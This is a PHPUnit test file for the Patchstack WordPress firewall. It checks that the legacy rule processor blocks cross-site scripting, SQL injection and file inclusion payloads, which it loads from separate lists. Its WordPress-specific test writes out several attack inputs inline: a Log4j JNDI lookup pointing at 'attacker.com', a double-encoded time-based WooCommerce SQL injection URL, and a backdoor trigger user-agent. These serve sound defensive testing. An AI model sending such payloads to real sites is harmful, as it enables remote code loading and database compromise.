<?php

declare(strict_types=1);

use PHPUnit\Framework\TestCase;
use Patchstack\Processor;
use Patchstack\Extensions\Test\Extension;

final class FirewallLegacyTest extends TestCase
{
    /**
     * @var Processor
     */
    protected $processor;

    /**
     * @var array
     */
    protected $rules;

    /**
     * Setup the test for testing the header location redirect.
     *
     * @return void
     */
    protected function setUp(): void
    {
        $this->rules = json_decode(file_get_contents(dirname(__FILE__) . '/data/RulesLegacy.json'), true);
    }

    /**
     * Setup the firewall processor.
     *
     * @param  array $rules
     * @return void
     */
    private function setUpFirewallProcessor(array $rules)
    {
        $this->processor = new Processor(
            [],
            $rules,
            [],
            [],
            new Extension()
        );
    }

    /**
     * Alters the payload between tests.
     * For most firewall rules there's no difference if testing against GET or POST.
     * Therefore, both can be used for testing payloads.
     *
     * @return void
     */
    private function alterPayload(array $payload = [])
    {
        $_POST = [];
        $_GET = [];

        $_POST = isset($payload['POST']) ? $payload['POST'] : [];
        $_GET = isset($payload['GET']) ? $payload['GET'] : [];
    }

    /**
     * Testing all firewall rules with no payload should result nothing.
     *
     * @return void
     */
    public function testAllRules()
    {
        $this->setUpFirewallProcessor($this->rules);
        $this->assertTrue($this->processor->launchLegacy());
    }

    /**
     * Test different cross-site scripting attacks.
     *
     * @return void
     */
    public function testXSS()
    {
        $this->setUpFirewallProcessor($this->rules);

        // Load list of about 1000 XSS payloads.
        $payloads = file_get_contents(dirname(__FILE__) . '/data/PayloadsXSS.txt');
        $payloads = explode("\n", $payloads);
        foreach ($payloads as $payload) {
            if (trim($payload) == '') {
                continue;
            }

            $this->alterPayload(
                ['GET' => [
                'q' => $payload
                ]]
            );
            $this->assertFalse($this->processor->launchLegacy(false), 'Testing XSS failed with payload: ' . $payload);
        }
    }

    /**
     * Test different SQL injection attacks.
     *
     * @return void
     */
    public function testSQLI()
    {
        $this->setUpFirewallProcessor($this->rules);

        // Load list of about 1000 XSS payloads.
        $payloads = file_get_contents(dirname(__FILE__) . '/data/PayloadsSQLI.txt');
        $payloads = explode("\n", $payloads);
        foreach ($payloads as $payload) {
            if (trim($payload) == '') {
                continue;
            }

            $this->alterPayload(
                ['GET' => [
                'q' => $payload
                ]]
            );
            $this->assertFalse($this->processor->launchLegacy(false), 'Testing SQLI failed with payload: ' . $payload);
        }
    }

    /**
     * Test different local file inclusion attacks.
     *
     * @return void
     */
    public function testLFI()
    {
        $this->setUpFirewallProcessor($this->rules);

        // Load list of about 1000 XSS payloads.
        $payloads = file_get_contents(dirname(__FILE__) . '/data/PayloadsLFI.txt');
        $payloads = explode("\n", $payloads);
        foreach ($payloads as $payload) {
            if (trim($payload) == '') {
                continue;
            }

            $this->alterPayload(
                ['GET' => [
                'q' => $payload
                ]]
            );
            $this->assertFalse($this->processor->launchLegacy(false), 'Testing LFI failed with payload: ' . $payload);
        }
    }

    /**
     * Test different WordPress specific attacks.
     *
     * @return void
     */
    public function testWordPressSpecific()
    {
        $this->setUpFirewallProcessor($this->rules);

        // Block Freemius vulnerability through action method.
        $this->alterPayload(
            ['GET' => [
            'action' => 'fs_retry_connectivity_test_'
            ]]
        );
        $this->assertFalse($this->processor->launchLegacy(false));

        // Block AccessPress backdoor through user-agent.
        $_SERVER['HTTP_USER_AGENT'] = 'wp_is_mobile';
        $this->alterPayload();
        $this->assertFalse($this->processor->launchLegacy(false));
        $_SERVER['HTTP_USER_AGENT'] = '';

        // Block Apache Log4j vulnerability.
        $this->alterPayload(
            [
            'GET' => [
                'q' => '${jndi:ldap://attacker.com/reference}'
            ]
            ]
        );
        $this->assertFalse($this->processor->launchLegacy(false));

        // Block WooCommerce SQL injection.
        $this->alterPayload();
        $_SERVER['REQUEST_URI'] = '/wp-json/wc/store/products/collection-data?calculate_attribute_counts\[\]\[query_type\]=and&calculate_attribute_counts\[\]\[taxonomy\]=poc%252522%252529%252520OR%252520SLEEP%2525281%252529%252523';
        $this->assertFalse($this->processor->launchLegacy(false));
        $_SERVER['REQUEST_URI'] = '';
    }
}
